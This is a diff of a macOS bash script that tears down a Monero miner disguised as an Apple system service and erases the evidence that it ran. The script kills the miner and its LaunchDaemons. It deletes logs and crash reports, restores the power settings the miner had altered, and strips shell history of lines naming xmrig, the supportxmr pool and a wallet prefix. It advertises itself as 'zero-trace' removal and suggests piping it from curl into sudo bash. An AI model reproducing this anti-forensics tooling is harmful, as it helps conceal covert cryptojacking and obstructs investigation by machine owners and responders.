@@ -1,48 +1,57 @@
 #!/usr/bin/env bash
-# ============================================================
 # remove_xmr.sh — Zero-trace removal of XMR miner
-# ============================================================
 
 DISGUISE_NAME="com.apple.coremedia.network"
-INSTALL_DIR="$HOME/Library/Application Support/.cmnd"
-PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
-LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
+INSTALL_DIR="/Library/Application Support/.cmnd"
+PLIST_PATH="/Library/LaunchDaemons/${DISGUISE_NAME}.plist"
+CAFF_PLIST="/Library/LaunchDaemons/com.apple.caffeinated.plist"
+LOG_PATH="/Library/Logs/${DISGUISE_NAME}.log"
+
+if [[ $EUID -ne 0 ]]; then
+  echo "[!] Run with sudo: sudo curl -fsSL .../remove_xmr.sh | sudo bash"
+  exit 1
+fi
 
 echo ""
 echo "=========================================="
 echo " XMR Miner — Full Removal"
 echo "=========================================="
 
-echo "[1/6] Stopping miner process..."
-launchctl bootout "gui/$(id -u)" "$PLIST_PATH" 2>/dev/null || true
-launchctl unload -w "$PLIST_PATH" 2>/dev/null && echo "      ✓ LaunchAgent unloaded" || echo "      — Not loaded"
-pkill -9 -f "$DISGUISE_NAME" 2>/dev/null && echo "      ✓ Process killed" || echo "      — Not running"
+echo "[1/6] Killing process..."
+pkill -9 -f "$DISGUISE_NAME" 2>/dev/null && echo "      ✓ Killed" || echo "      — Not running"
 pkill -9 -f "xmrig" 2>/dev/null || true
+pkill -9 -f "caffeinate" 2>/dev/null || true
 sleep 1
 
-echo "[2/6] Removing binary + config..."
-[[ -d "$INSTALL_DIR" ]] && rm -rf "$INSTALL_DIR" && echo "      ✓ $INSTALL_DIR deleted" || echo "      — Not found"
+echo "[2/6] Removing LaunchDaemons..."
+launchctl bootout system "$PLIST_PATH" 2>/dev/null || true
+launchctl bootout system "$CAFF_PLIST" 2>/dev/null || true
+launchctl bootout "gui/$(id -u)/${DISGUISE_NAME}" 2>/dev/null || true
+rm -f "$PLIST_PATH" "$CAFF_PLIST"
+rm -f /Library/LaunchAgents/${DISGUISE_NAME}.plist 2>/dev/null || true
+echo "      ✓ LaunchDaemons removed"
 
-echo "[3/6] Removing plist..."
-[[ -f "$PLIST_PATH" ]] && rm -f "$PLIST_PATH" && echo "      ✓ Plist deleted" || echo "      — Not found"
+echo "[3/6] Removing files..."
+rm -rf "$INSTALL_DIR" && echo "      ✓ Install dir removed"
 
 echo "[4/6] Wiping logs..."
-rm -f "$LOG_PATH" && echo "      ✓ Log wiped" || echo "      — No log found"
+rm -f "$LOG_PATH" && echo "      ✓ Log wiped"
+find /Library/Logs/DiagnosticReports -name "*coremedia.network*" -delete 2>/dev/null || true
 
-echo "[5/6] Scrubbing shell history..."
-for HIST in "$HOME/.zsh_history" "$HOME/.bash_history"; do
-  [[ -f "$HIST" ]] && sed -i '' '/mine_xmr\|xmrig\|coremedia\.network\|supportxmr\|45yWnSb/d' "$HIST" 2>/dev/null && echo "      ✓ $HIST cleaned"
+echo "[5/6] Restoring power settings..."
+pmset -a sleep 1
+pmset -a displaysleep 10
+pmset -a standby 1
+echo "      ✓ Sleep settings restored"
+
+echo "[6/6] Scrubbing history..."
+for H in "$HOME/.zsh_history" "$HOME/.bash_history"; do
+  [[ -f "$H" ]] && sed -i '' '/mine_xmr\|xmrig\|supportxmr\|coremedia\.network\|45yWnSb/d' "$H" 2>/dev/null && echo "      ✓ $H cleaned"
 done
 history -c 2>/dev/null || true
 
-echo "[6/6] Removing crash reports..."
-find "$HOME/Library/Logs/DiagnosticReports" \( -name "*xmrig*" -o -name "*coremedia.network*" \) -delete 2>/dev/null
-echo "      ✓ Done"
-
 echo ""
-echo "=========================================="
-[[ ! -d "$INSTALL_DIR" && ! -f "$PLIST_PATH" && ! -f "$LOG_PATH" ]] \
+[[ ! -d "$INSTALL_DIR" && ! -f "$PLIST_PATH" ]] \
   && echo " ✓  Complete — Zero trace remaining." \
-  || echo " [!] Some files may remain — check manually."
+  || echo " [!] Check manually."
 echo "=========================================="
-echo ""
